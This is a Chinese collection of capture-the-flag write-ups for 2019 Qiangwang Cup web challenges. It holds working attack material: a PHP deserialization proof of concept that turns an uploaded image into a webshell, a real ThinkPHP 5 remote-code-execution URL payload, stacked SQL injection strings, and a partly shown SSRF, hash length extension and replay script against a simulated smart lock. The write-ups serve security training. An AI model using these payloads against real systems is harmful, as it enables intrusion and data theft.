# 2019强网杯
本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|难|

# 网上公开WP:
+ https://www.zhaoj.in/read-5873.html
+ https://altman.vip/2019/05/27/QWB2019-writeup/

# 题目下载：
+ https://github.com/glzjin/qwb_2019_smarthacker
+ https://github.com/glzjin/qwb_2019_upload

# 本站备份WP
**感谢作者: Glzjin、Donek1、wu1a、admin-琴里**
## Web
### UPLOAD

知识点：代码审计，PHP 反序列化。

步骤：

1.先打开靶机看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588315116632a22379b951bd03488e1f540824a3-1024x610.png)

2.看起来是个登录和注册页面，那么就先注册然后登录试试吧。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316155ab45b21322b64c03cfbd8142644d0aa-874x1024.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883162455655488de7893bff5614210c25c7f7c.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316482c048c42c816c7619e902ba7ad6a2b3d-926x1024.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316607f0bbaeaad2bb13fedf5a1259baf95b8.png)

3.登录之后看到这样一个页面，测了一下只能上传能被正常查看的 png。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883185208dd35b4766dc02ee91983d15ec3f94f-1024x687.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318636c3e97cf680f218d022c876c0e8e148b.png)

4.跳转到了一个新的页面，这个页面似乎没有任何实际功能了。然后可以看到我们图片是正确被上传到服务器上的 /upload/da5703ef349c8b4ca65880a05514ff89/ 下了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318903e74b4fc7850d13dde50cb1d8ab12301-1024x570.png)

5.然后我们来扫扫敏感文件，发现 `/www.tar.gz` 下有内容（其实是从第二题得到的提示），下载下来解压看看，发现是 ThinkPHP 5 框架写的。

www.tar.gz[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15588320959d0a5958211037910e55ab9d4a45ccc1.gz)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832218cad9f782eda9b653f9e195efc63cf59a-1024x613.png)

6.而且其有 .idea 目录，我们将其导入到 PHPStorm 看看吧。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813-1024x626.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813.png)

7.发现其在 `application/web/controller/Register.php` 和 `application/web/controller/Index.php` 下有两个断点，很诡异，估计是 Hint 了。

application/web/controller/Register.php：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832405f820b22bee73719de7d597b312004cd2.png)

application/web/controller/Index.php：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588323518efcf869541b8638db34f86a0fed9622-1024x303.png)

8.看了看，发现这两个点的流程大概如下。

`application/web/controller/Index.php` 里的：

首先访问大部分页面例如 index 都会调用 login_check 方法。

该方法会先将传入的用户 Profile 反序列化，而后到数据库中检查相关信息是否一致。

`application/web/controller/Register.php` 里的：

Register 的析构方法，估计是想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法，也就是跳到主页了。

9.然后再来审一下其他代码，发现上传图片的主要逻辑在 `application/web/controller/Profile.php` 里。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832931289f7b7dd7dca7839b5bac4f0835ac0e-1024x572.png)

先检查是否登录，然后判断是否有文件，然后获取后缀，解析图片判断是否为正常图片，再从临时文件拷贝到目标路径。

而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883378645e1badb77713a21a54e9696f5a738dd-1024x626.png)

看起来似乎天衣无缝。

但别忘了前面我们有反序列化和析构函数的调用，结合这三个地方我们就可以操控 Profile 里的参数，控制其中的 upload_img 方法，这样我们就能任意更改文件名，让其为我们所用了。

11.首先用蚁剑生成个马，再用 hex  编辑器构造个图片马，注册个新号上传上去。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588333581865d65bcc00cad9fab6156cd2d24b6b-1024x688.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883342647b20e3e79d8a790485cdde46ac35e1b-1024x647.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558833505be82461dd72b9f059ba85653fb4cec53-1024x601.png)

12.然后构造一个 Profile 和 Register 类，命名空间 app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 ['index' =&gt; 'img']，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834087d842ce0a929a743be2662806866a0a39-1024x629.png)

而后我们又赋值控制 filename_tmp 和 filename 成员变量。可以看到前面两个判断我们只要不赋值和不上传变量即可轻松绕过。ext 这里也要赋值，让他进这个判断。而后程序就开始把  filename_tmp 移动到 filename，这样我们就可以把 png 移动为 php 文件了。

而后，我们还要构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了。

 13.最终 Poc 生成脚本如下，PHP 的。
```
<?php
namespace app\web\controller;

class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
$profile->filename_tmp = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.png";
$profile->filename = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.php";

$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));`
```

注意这里的文件路劲，看 Profile 的构造方法有切换路径，这里我们反序列化的话似乎不会调用构造方法，所以得自己指定一下路径。

14.运行，得到 Poc。

```
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkL2RhNTcwM2VmMzQ5YzhiNGNhNjU4ODBhMDU1MTRmZjg5L2U2ZTljNDgzNjg3NTJiMjYwOTE0YTkxMGJlOTA0MjU3LnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9lNmU5YzQ4MzY4NzUyYjI2MDkxNGE5MTBiZTkwNDI1Ny5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9
```

15.然后置 coookie。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834498e3c796623859fe12a523e3fea49af8ab-1024x784.png)

16.刷新页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588345217ba8d594e1161251c60db4e34f763b17-1024x555.png)

17.可以看到我们的小马已经能访问了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883455117b71285b8a3392e8233c7de7311cde3-1024x411.png)

18.然后蚁剑连上，打开 /flag 文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346181bd8fa356b22e840d4296f217666ebe8-1024x688.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346387ab9fa88b0dc076a1d83a02110c62ea1-1024x688.png)

19.Flag 到手~

### 高明的黑客

知识点：代码审计，动态测试

步骤：

1.打开靶机，是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835272fd70292e56dc92e7b063263780c6de81-1024x211.png)

2.那就下载源码吧。

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/155883536268cab8ffa70daa14e59a5941c55461ab.gz)

3.来看看，发现大部分文件都是一些垃圾代码，难以解读。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835400d75a27d6992ead8e8723ec35a14a740d-1024x804.png)

但有些地方是能看的，比如

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883542371663e53d48fb28b5574ca913ba4c2ed.png)

前头赋值，神仙难救。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835445834b884adfc23e438c0e0724130e10a2.png)

神仙难救。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835627a0a378ce6daac5a406ae906c738b21d7.png)

神仙难救。

4.但总有些地方可用的，来写个脚本批量扫描一下 _GET 和 _POST，给他们传一些特定的代码(比如 echo("glzjin"); /echo("glzjin") / echo glzjin，eval，assert，system 函数需要分别处理，一个文件需要用几种姿势多测几次)看看能执行不，能执行返回这种特定的字符串就说明此处可用。

Python 脚本如下：

```
import os
import threading
from concurrent.futures.thread import ThreadPoolExecutor

import requests

session = requests.Session()

path = "/Users/jinzhao/PhpstormProjects/qwb/web2/"  # 文件夹目录
files = os.listdir(path)  # 得到文件夹下的所有文件名称

mutex = threading.Lock()
pool = ThreadPoolExecutor(max_workers=50)

def read_file(file):
    f = open(path + "/" + file);  # 打开文件
    iter_f = iter(f);  # 创建迭代器
    str = ""
    for line in iter_f:  # 遍历文件，一行行遍历，读取文本
        str = str + line

    # 获取一个页面内所有参数
    start = 0
    params = {}
    while str.find("$_GET['", start) != -1:
        pos2 = str.find("']", str.find("$_GET['", start) + 1)
        var = str[str.find("$_GET['", start) + 7: pos2]
        start = pos2 + 1

        params[var] = 'echo("glzjin");'

        # print(var)

    start = 0
    data = {}
    while str.find("$_POST['", start) != -1:
        pos2 = str.find("']", str.find("$_POST['", start) + 1)
        var = str[str.find("$_POST['", start) + 8: pos2]
        start = pos2 + 1

        data[var] = 'echo("glzjin");'

        # print(var)

    # eval test
    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # assert test
    for i in params:
        params[i] = params[i][:-1]

    for i in data:
        data[i] = data[i][:-1]

    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # system test
    for i in params:
        params[i] = 'echo glzjin'

    for i in data:
        data[i] = 'echo glzjin'

    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # print("====================")

for file in files:  # 遍历文件夹
    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开
        # read_file(file)

        pool.submit(read_file, file)

```

5.然后在本地开个 PHP 服务器。

> /usr/bin/php -S localhost:11180 -t /Users/jinzhao/PhpstormProjects/qwb

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835730ae911ad0e232535244aa4161081c6092-1024x191.png)

6.运行脚本，开扫，扫到一个咯~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835861a07aab06b0dd3c5c0ca5f0d6941a721e-1024x128.png)

7.去这个文件里看看。这一段是关键，拼接了一个 System  出来调用 Efa5BVG 这个参数。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835902b176094d2d7d236cc96ffe305e6e5d32-1024x346.png)

8.OK，那么就来试试读取 flag 吧。访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588359964fd8d1dc8b2264e7eedaedb29fd8f327-1024x133.png)

9. Flag 到手~

### 上单

知识点：通用组件已知漏洞熟悉度- -？

1.打开靶机，发现似乎可以遍历目录。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588630365222ff84e669c9f4d67603d9182e1cce.png)

2.点进去看看，似乎是 ThinkPHP。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863068360f8c91911146043d6ef94e04754fb9.png)

3.看看 Readme，似乎是 ThinkPHP 5.0?

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863271a0280aefb5cf6d17d0bb028cdb021ced-1024x855.png)

4.直接上次去防灾打比赛的 payload 一把梭。

`/1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155886333377c0f22d589fc77be54e46e40d55a34f-1024x100.png)

5. Flag 到手~

### 随便注

知识点：堆叠注入

步骤：

1.打开靶机，发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588772236949e6ef54f82dbde3dc40ff3881b530-1024x239.png)

2.然后提交试试。发现似乎是直接把返回的原始数据给返回了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887735899e0ead8aeecbbcfbb05d29796da4dff-1024x412.png)

3.然后来测试一下有没有注入，似乎是有的。

`/?inject=1%27or+%271%27%3D%271
/?inject=1' or '1'='1`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877587d94b7f6fde49a61ec1cb2bdd929e7122-1024x753.png)

4.来检查一下过滤情况，过滤函数如下。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887769840011b0dcc021be32d8fb64955e080b1-1024x221.png)

过滤了 select，update，delete，drop，insert，where 和 点。

5.咦，过滤了那么些词，是不是有堆叠注入？一测，还真有。下面列出数据库试试。

```
/?inject=222%27%3Bshow+databases%3B%23
/?inject=222';show databases;#
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877945ef512666a7f31f73119a0a6bb253e24c-1024x588.png)

6. OK,可以。那看看有啥表。

`/?inject=222%27%3Bshow+tables%3B%23
/?inject=222';show tables;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878266092f2e11111c57946135801d4c4d75da-1024x505.png)

7.来看看这个数字为名字的表里有啥。看来 flag 在这了。

`/?inject=222%27%3Bshow+columns%20from%20`1919810931114514`%3B%23
/?inject=222';show columns from `1919810931114514`;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878322f559521d405818004e5652567e90cde5-1024x639.png)

8.然后是 words 表，看起来就是默认查询的表了。

`/?inject=222%27%3Bshow+columns%20from%20`words`%3B%23
/?inject=222';show columns from `words`;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588784806bdfdf08f05e3715a7e20cb70c5dc706-1024x910.png)

9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。

先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。

这样就可以让程序直接查询出 flag 了。

10.构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -）

```
/?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;#
```
```
/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#`
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878854cebb31f09962fa4807dd9846d0df86e8-1024x821.png)

11.用 `1' or '1'='1 `访问一下。

`/?inject=1%27+or+%271%27%3D%271#
/?inject=1' or '1'='1

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588789483e5ae94244cef60da3688fab16d8502b-1024x387.png)

12. Flag 到手~

### 智能门锁
**admin-琴里提供(转自某大佬WP)**

官网打开后是一个智能门锁的官方网站，查看源代码后发现了两个可以访问的地址，一个是`https://factory.ctf.aoicloud.com/demo`目录，另一个是`https://school.ctf.aoicloud.com/`。

根据官网介绍，demo子目录下的站点似乎是管理后台的一个演示版，使用下面给出的admin，admin用户名密码进入后台。

注意到后台首页有一个动态获取公告的接口，经过测试是使用curl直接获取get参数url内的地址，同时具有ssrf漏洞，使用file协议可以获得网站的所有源码。

公告内提供了一个V2.firm文件的下载地址，下载下来后查看文件头发现是zip压缩包，解压后获得一个hex格式的文件。

school域名下的网站无法直接访问，检查demo源码可知，所谓的waf只是判断client
ip这个HTTP头内的IP作为访客IP，通过在请求中添加Client-IP头为192.168.1.1伪造来源IP即可正常访问

测试发现使用guest账户登录至学校后台，学校后台的公告内多一条维修记录，并且包含一个pcap抓包文件。

尝试发现，官网固件有v1和v2两个版本，结合官网公告，推测v2是新固件，v1是老固件。

使用IDA打开固件进行逆向分析。固件是Atmega128程序，首先分析V2固件。

根据__RESET部分代码可知，门锁运行后会进行内存初始化，静态区的数据会从固件地址0x1636处开始加载，内存的起始地址为0x0100。

sub_06E会使用位于内存0x0372处的一个uint8变量统计访问次数，每次访问会将其增加1，该变量也会作为下标，访问位于内存0x031A处的一个数组，该数组的初始值为“get
and set timestamp not
implement”，出题人在此处告知我们获取和设置时间戳的部分并没有真正实现。

![](https://cy-pic.kuaizhan.com/g3/8f/eb/9fd5-6e9d-4132-824f-6c6141accbd928)

这个函数在返回前接着读取了位于内存0x0373-0x0376的变量uint32，将其与上方提示数组取出的一个值相加得到最终的返回值。

![](https://cy-pic.kuaizhan.com/g3/f5/59/fdbb-5406-48bd-88c5-578eeff99b8825)

sub_065函数内将一个uint32类型的参数直接存入0x0373-0x0376，函数无返回值，结合出题人的hint推测出sub_06E是用于读取门锁时间戳的函数，sub_065是设置时间戳的函数。

sub_08D的功能是将0x0373-0x0376部分内存全部置0，猜测此函数为初始化门锁系统时钟的函数。

![](https://cy-pic.kuaizhan.com/g3/ab/98/ec2b-9c87-4d68-8650-b6a7ab54a0da64)

sub_096函数初始化了atmega128单片机A组IO口的模式，A0和A1被设置为了输出口。由于整个固件没有涉及到其它的通用io口，猜测A0和A1可能和控制门锁有关系，该函数的用途为初始化控制门锁的IO口。

![](https://cy-pic.kuaizhan.com/g3/9c/91/9d0a-caee-48cb-bcc6-2c017e476c2182)

sub_09A内印证了以上的推测，该函数根据调用参数（R24）的值设置io口A0的电平状态。猜测是控制门锁的函数。

sub_0A0与sub_06E（set_clock）比较相似，但它访问的数组的起始地址是0x033E，该数组的初始值为”
get random function not
implement”。出题人在此处提示我们产生随机数的函数也没有具体代码实现，因此该函数本身含义应该是产生一段随机序列，该函数会往第一个参数指向的内存区域复制复制一段随机字节序列，长度由第二个参数给出，原型应当为get_random(uint8_t
\*dst, uint8_t size)。

sub_06B函数内无退出代码，并且函数开头调用了多个初始化函数，因此该函数应该为main函数。

函数sub_2C9，sub_2D3，sub_2D7，sub_2DB均为uart有直接联系，结合具体汇编指令，以上四个函数分别命名为init_uart_sub，uart_read，uart_write，init_uart。

结合gcc-avr使用的链接库libc.a对比分析可知，固件内sub_9E2和sub_A7A分别为malloc和free。

根据main函数大循环内的逻辑与执行流程可以推断出，sub_1EB的功能应当为释放数据包对象。sub_19E则为初始化数据包对象。数据包对象在源代码中应当为一个结构体。数据包结构体结构应当如下形式：
```
struct Packet
{
	uint8_t packet[38]
	uint8_t extenstion_length
	uint8_t *extension
}
```

数据包结构体的长度为41个字节，其中前38字节是每个数据包均包含的部分。第39字节似乎为后面扩展部分的长度，而最后两个字节则是一个指针，extension指针指向的内存长度由extension_length提供。

数据包对象在初始化时并不为extension部分申请内存，而前38字节则固定存在，因此猜测这38字节应当为数据包的包头。而extension部分则为数据包的扩展部分。

sub_1FE内设置了数据包包头的第34-37字节，设置的值是由get_timestamp函数提供的，因此该函数功能应该是封装数据包时设置数据包内的时间戳。

![](https://cy-pic.kuaizhan.com/g3/c3/79/cdf5-581f-45ce-b6e0-c4f92b34538326)

同时注意到设置时间戳前对时间戳进行了字节序调整处理，转换为了大序端，因此数据包内的时间戳应该是以大序端保存的。

sub_20A内会将数据包的第38字节修改为参数，根据后面的分析可知，该字段为数据包类型字段，因此该函数用途为封装数据包时设置数据包类型。

sub_20D会对数据包结构体的第39-41字节进行处理。功能是将参数src指向的内存复制n个字节到数据包的extension部分。

sub_2DC函数会从uart中读取数据，uart中读取的首字节为数据的长度，随后会使用malloc分配该长度的缓冲区，依次读取。

该函数的后半段会构造一个数据包，前38字节直接填充进入Packet结构体的包头部分。

![](https://cy-pic.kuaizhan.com/g3/67/8f/9692-b1e8-4722-ae5a-a0e9dd600a9909)

随后对检查数据包长度，当长度大于38字节时，数据包的后续部分被填充进入Packet中的extension部分。

sub_2FE会将数据包的内容依次通过uart发送出去，在发送数据包之前会计算并发送一个长度。

![](https://cy-pic.kuaizhan.com/g3/35/b6/353c-ee28-46a9-a095-af65db15413758)

在sub_787内发现了8个熟悉的立即数，0x6A09E667，0xBB67AE85……，这些数字为sha256算法的初始哈希值，很显然这个函数是完成sha256计算前的初始化工作。

![](https://cy-pic.kuaizhan.com/g3/db/ee/0746-27e4-482d-8c87-ab1da5d36bc768)

在函数sub_234和函数sub_277中，均调用了上述的sha256_init，猜测这两个函数会执行sha256计算操作，根据后面对main函数的分析可知，这两个函数一个用于数据包签名，一个用于检查数据包签名。这两个函数内均在sha256_init后多次调用sub_7E0，并且传递相同的参数（R28:29），同时，在完成sub_7E0最后一次调用后均使用同一参数（R28:29）调用了函数sub_854，在sub_7E0和sub_854内均调用函数sub_327对传入的数据进行处理，因此sub_327应为进行sha256变换的关键函数（sha256_transform）。

sub_7E0会在缓冲区内长度满足0x40即64字节时调用sha256_transform，正好是sha256计算时的一个块大小。否则只是将传入参数内的数据复制进入缓冲区，不执行变换。因此该函数应当进行的是sha256_update的操作。

sub_854（sha256_final）是sha256计算时的最后一步，函数内实现了对消息的填充，并最终调用sha256_transform完成sha256计算。

函数sub_234和函数sub_277的前一部分完全相同，但sub_277在sha256_final完成sha256计算后多调用了一个函数sub_B03，这是一段比较内存值的代码，即memcmp。比较数据包的签名字段与数据包的签名是否相同。

通过该函数可以推出，数据包的签名位于第1-33字节，签名的计算方法为

sign=sha256(???+packet_header+packet_extension)

???为传递给签名函数的第二个参数，根据main函数的分析可知为签名密钥。

至此基本函数分析完毕，下面分析main函数的内部逻辑与执行流程。

main函数首先进行了门锁，时间戳和UART的初始化，然后开始了一个死循环。

循环体的一开头使用函数从uart上接收到了一个数据包。

![](https://cy-pic.kuaizhan.com/g3/52/4e/bc69-bbbe-4d05-b0f8-888547fd6e2191)

首先检查数据包的第一个字节，根据上下文可知，数据包首字节必须为0x02，结合题目描述，推测此字节为协议的版本标记

![](https://cy-pic.kuaizhan.com/g3/74/98/84f5-e431-49c3-a843-e9d236d634dd67)

随后跳过前0x25即第38字节偏移处，检查该字节是否为0，注意到后面有多处检测该字节值的判断，根据该字节的值执行了不同的操作，推测该字节为数据包操作类型标记。

![](https://cy-pic.kuaizhan.com/g3/31/0c/78be-1714-4ff0-beee-8938777a21c293)

当数据包类型为0时，检查了一个全局的变量，在第一次执行后，该变量被设置为0x01，在满足执行条件时对内存地址为0x2A0处进行数据了16字节的内存复制，源地址为数据包的结构体的第39字节？根据后面对数据包结构体的逆向分析可知，此处是数据包额外的payload部分。

当数据包类型为0x12时，会创建一个响应数据包，数据包类型为0x13，同时调用get_random()，此函数使用栈进行数据返回，执行后随机数被复制进一个4字节的全局变量内，内存地址为0x206，后面可看到改随机数会在处理同步数据包时进行检查。

同时，这个随机数被作为参数传递给packet_append_data，作为返回数据返回给请求方。

![](https://cy-pic.kuaizhan.com/g3/8f/83/5020-5bf5-4823-85a9-2a83c94f4a0922)

当数据类型不为0x00和0x12时，会进行数据包签名校验和数据包时间戳检查，根据此处得到时间戳位于数据包的33-37字节，要求数据包的时间戳与门锁的系统时间戳误差小于5

![](https://cy-pic.kuaizhan.com/g3/4a/88/7fb1-2f8c-4d06-b6db-a827c582221085)

完成数据包签名和时间戳检查后，会继续判断数据包类型。当类型为0x10时，会将数据包payload
内第二个字段与内存地址为0x206的内存进行比较，即比较比较0x12数据包时全局保存的四字节随机数。

![](https://cy-pic.kuaizhan.com/g3/cd/83/8cd7-468a-4613-a49e-e01d85e80b0d34)

随机数验证通过后，会执行时间戳更新和一段不知用途的内存复制

![](https://cy-pic.kuaizhan.com/g3/64/1a/b8f6-2544-4560-8c5a-411bc267315e79)

内存复制的源地址为数据包payload部分第二字节，长度由payload第一字节提供。

时间戳由数据包的33-37字节时间戳字段提供。目标地址为0x106，出题人提醒该内存缓冲区为屏幕显示的内容，会在时间同步时更新`（“This is the message displayed on screen. It will get synchronized while time synchronization”）`与我们当前的分析相符。

0x10的响应包类型为0x11，payload为空。

当数据包类型为0x20时，会检查数据包结构体内payload 的整体长度要求必须为2

![](https://cy-pic.kuaizhan.com/g3/40/f1/6082-e77f-486d-a4c0-e5150e69fd6a35)

当数据包payload长度为2时，就会根据payload第二字节的内容控制门锁，0xf0会将端口置为高电平，0x0f则置为低电平。

![](https://cy-pic.kuaizhan.com/g3/ec/f3/1e9b-b577-4d11-b4b7-2a01382e3b1965)

随后程序进行了内存复制，将起始内存地址为0x260，长度17字节，该段内存的初始值为字符串“flag
will be
here”，该字符串会作为门锁响应数据包的payload部分返回。因此只要我们能操纵门锁并接收响应的数据包即可获得flag。

分析得出的V2版本数据包格式为：

| 字段        | 长度         | 值或含义                 |
|:-----------:|:------------:|:-----------------------:|
| version     | 1Byte(0)     | 0x02                    |
| sha256 sign | 32Byte(1-32) | 数据包签名               |
| timestamp   | 4Byte(33-36) | 时间戳                   |
| packet type | 1Byte(37)    | 数据包类型               |
| extension   | 变长         | 部分数据包拥有的额外数据   |

数据包的签名计算方法为：

`sign= sha256(key+timestamp+packet_type+payload)`

数据包类型：

0x00，向门锁发送密钥设置，只可在开机时运行一次，成功后返回0x01,extension部分为空的数据包

0x10，同步数据包，根据固件内字符串初始值的提示可知该类型数据包用于设置屏幕显示字符和时间戳同步，门锁会使用接收到的数据包的timestamp字段更新系统时钟。设置成功后门锁会返回类型为0x11的数据包。该数据包内需要在ext字段携带一个由0x12请求获得的4字节随机数，否则门锁不会接受该数据包。

0x12，随机数请求数据包？向门锁发送该包会返回一个类型为0x13的数据包，响应数据包的ext[1:5]字段包含一个4字节的随机数，该随机数会在处理同步数据包（type=0x10）时进行检查。该数据包不检查签名与数据包的时间戳。

使用同样的方法和思路分析v1版本固件，可以发现v1，v2版的数据包格式和签名计算方法完全相同。数据包格式和extension部分内容略有区别。

0x00，向门锁发送密钥设置，只可在开机时运行一次，成功后返回0x01,extension部分为空的数据包

0x10，同步数据包，extension部分为空，门锁仅检查数据包签名，不再检查时间戳，一旦签名验证通过，则使用数据包的timestamp字段修改自身系统时间。成功后返回0x11数据包，extension也为空。由于没有任何交互验证过程，若能在链路上窃取到数据包，则可以使用数据包重放攻击篡改系统时间。

0x20，门锁控制包，extension部分为操作，0x01f0为开锁，成功后返回0x20数据包。

通过pcap文件，我们可以得到v1版本的时间同步包和timestamp为同步时间的开锁包。

**解题思路**

学校管理后台内下载到的抓包文件可以获得10.2.3.103门锁的管理端口为2333，使用TCP通信，根据发送数据和响应数据发现文件内只提供了version字段为1的数据包。

由于门锁位于内网，尝试使用学校管理后台的get_info.php进行ssrf攻击，使用gopher协议向门锁发送TCP请求。

首先尝试对门锁重放版本1的数据包，门锁均无返回且立即断开了连接。

考虑到官方提示中的“门锁固件升级“，猜测门锁已升级至V2版固件，由于V2版固件内只有类型为0x00和0x12的数据包不会检查签名和时间戳，尝试构造V2版数据包向门锁发送。

经测试发现，门锁不响应0x00数据包，说明门锁已经被设置签名密钥，不能通过篡改签名密钥实施开锁。

但0x12数据包成功返回了一个随机数，同时考虑到v1版本和v2版本开门的请求数据包格式是完全相同的，只有开头的版本号不同，若能篡改门锁的时间戳即可尝试使用抓包文件内获取到的开门数据包进行重放攻击。

根据逆向得知数据包的签名方法可以发现，该签名方法存在哈希长度扩展攻击漏洞。

pacp文件内开门数据包前正好存在一个v1版本的时间同步数据包，v1版本的时间同步包不包含extension字段，对其做sha256长度扩展攻击可构造一个存放于extension字段的payload，其首字节因为原sha256计算扩展时填充的0x80，末尾为用于门锁验证用的随机数。

重置服务器时间戳后立即重放提取自pcap文件内修改版本号的开锁数据包

攻击脚本如下：

```
import socket
import hashpumpy
import requests

class Tester:
    def send_curl(self, packet):
        packet = len(packet).to_bytes(1, 'big') + packet
        packet_url = "%" + "%".join(["%02X" % x for x in packet])
        url = "https://school.ctf.aoicloud.com/get_info.php"
        ret = requests.get(url, headers={
            'client-ip': '192.168.1.1', 'cookie': 'PHPSESSID=
        }, params={
            'url': "gopher://10.2.3.103:2333/_" + packet_url
        })
        return ret.content[1:]

def main():
    tester = Tester()
    packet = b'\x02' + b'\xff' * 32 + b'\x00' * 4 + b'\x12'
    ret = tester.send_curl(packet)
    rand = ret[39:43]
